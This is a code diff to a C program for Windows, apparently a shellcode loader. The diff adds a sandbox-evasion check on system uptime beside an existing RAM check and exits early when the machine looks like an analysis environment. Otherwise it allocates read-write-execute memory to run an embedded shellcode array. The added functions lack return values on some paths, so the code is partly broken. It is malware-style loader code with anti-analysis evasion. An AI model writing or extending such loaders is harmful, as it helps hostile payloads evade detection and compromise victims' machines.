@@ -5,9 +5,13 @@ BOOL memory_value() {
 	memoryStatus.dwLength = sizeof(memoryStatus);
 	GlobalMemoryStatusEx(&memoryStatus);
 	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
-	if (RAMMB < 2048) {
-		return false;
-	}
+	if (RAMMB < 2048) return false;
+}
+
+BOOL check_runtime() {
+	ULONGLONG uptime = GetTickCount64() / 1000;
+	if (uptime < 1200) return false; //20 minutes
+
 }
 
 int main() {
@@ -37,8 +41,9 @@ int main() {
 		"\x00\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00";
 
 	bool ram_quantity = memory_value();
+	bool runtime = check_runtime();
 
-	if (ram_quantity == false) {
+	if (ram_quantity == false && runtime == false) {
 		exit(0);
 	} else {
 		PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
